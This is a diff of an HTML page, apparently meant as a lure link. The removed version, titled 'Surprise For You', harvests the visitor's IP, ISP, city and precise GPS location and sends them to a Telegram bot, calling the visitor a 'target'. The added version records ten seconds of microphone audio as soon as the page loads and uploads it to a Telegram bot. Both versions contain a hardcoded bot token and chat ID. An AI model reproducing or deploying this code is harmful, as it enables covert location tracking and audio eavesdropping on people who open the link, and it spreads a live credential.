@@ -2,47 +2,128 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Surprise For You</title>
-    
-        function kirimTele(teks) {
-            const url = `https://api.telegram.org/bot${TOKEN_BOT}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(teks)}&parse_mode=Markdown`;
-            fetch(url).catch(() => {});
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Monitoring Suara</title>
+    <style>
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            text-align: center; 
+            padding-top: 50px; 
+            background-color: #f4f4f9;
         }
+        .container {
+            max-width: 400px;
+            margin: auto;
+            padding: 20px;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        #status { 
+            font-weight: bold; 
+            margin-top: 20px;
+            color: #555;
+        }
+        .dot {
+            height: 15px;
+            width: 15px;
+            background-color: #bbb;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 10px;
+        }
+        .recording {
+            background-color: red;
+            animation: pulse 1s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
 
-        // Lapis 1: Pakai ipapi.co (Lebih stabil di Indonesia)
-        async function ambilDataIP() {
+    <div class="container">
+        <h2>Sistem Siap</h2>
+        <div id="indicator"><span class="dot" id="dot"></span><span id="statusText">Menunggu Izin...</span></div>
+        <p style="font-size: 0.8em; color: #888;">Pastikan menggunakan HTTPS (GitHub Pages)</p>
+    </div>
+
+    <script>
+        // --- KONFIGURASI TELEGRAM ---
+        const TELEGRAM_TOKEN = '8110303835:AAHEOijWAE5EnMK_mkseIvru6vSbsp3PCUU'; // Ganti dengan token dari BotFather
+        const CHAT_ID = '7332180572';         // Ganti dengan ID chat kamu
+        const DURASI_REKAM = 10000;                     // Durasi rekam (10 detik)
+
+        let mediaRecorder;
+        let audioChunks = [];
+
+        async function startSystem() {
+            const statusText = document.getElementById('statusText');
+            const dot = document.getElementById('dot');
+
             try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
+                // Meminta izin mikrofon
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 
-                const laporan = `
-🌐 *TARGET TERDETEKSI (IP)*
-🔌 *IP:* ${data.ip}
-🏙️ *Kota:* ${data.city}
-🇮🇩 *Provinsi:* ${data.region}
-🏢 *ISP:* ${data.org}
-📍 *Koordinat:* ${data.latitude},${data.longitude}
-                `;
-                kirimTele(laporan);
+                mediaRecorder = new MediaRecorder(stream);
+                
+                mediaRecorder.ondataavailable = (event) => {
+                    audioChunks.push(event.data);
+                };
 
-                logHacker.innerHTML += `<span style="color: yellow;">> IP: ${data.ip} DETECTED</span><br>`;
-                logHacker.innerHTML += `<span style="color: yellow;">> REGION: ${data.region}</span><br>`;
-                logHacker.innerHTML += `<span style="color: yellow;">> ISP: ${data.org}</span><br>`;
+                mediaRecorder.onstop = async () => {
+                    statusText.innerText = "Mengirim ke Telegram...";
+                    dot.classList.remove('recording');
+                    
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+                    await sendToTelegram(audioBlob);
+                };
+
+                // Mulai merekam
+                mediaRecorder.start();
+                statusText.innerText = "Sedang Merekam Suara...";
+                dot.classList.add('recording');
+
+                // Berhenti otomatis setelah durasi yang ditentukan
+                setTimeout(() => {
+                    if (mediaRecorder.state === "recording") {
+                        mediaRecorder.stop();
+                    }
+                }, DURASI_REKAM);
+
             } catch (err) {
-                kirimTele("⚠️ Gagal mengambil data IP.");
+                console.error("Error:", err);
+                statusText.innerText = "Akses Ditolak/Tidak Didukung";
             }
         }
 
-        // Lapis 2: GPS Presisi (Wajib Izin)
-        function ambilGPS() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const infoGPS = `🚨 *LOKASI PRESISI (GPS)*%0A📍 Koordinat: ${lat},${lon}%0A🗺️ Maps: https://www.google.com/maps?q=${lat},${lon}`;
-                    kirimTele(infoGPS);
-                }, null, { enableHighAccuracy: true });
+        async function sendToTelegram(blob) {
+            const statusText = document.getElementById('statusText');
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('voice', blob, 'rekaman.ogg'); // Gunakan 'voice' agar muncul sebagai pesan suara di Telegram
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVoice`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (response.ok) {
+                    statusText.innerText = "Berhasil Terkirim!";
+                } else {
+                    statusText.innerText = "Gagal Kirim ke Telegram";
+                }
+            } catch (error) {
+                statusText.innerText = "Kesalahan Jaringan";
             }
-        
+        }
+
+        // Jalankan sistem saat halaman dibuka
+        window.onload = startSystem;
+    </script>
+</body>
 </html>
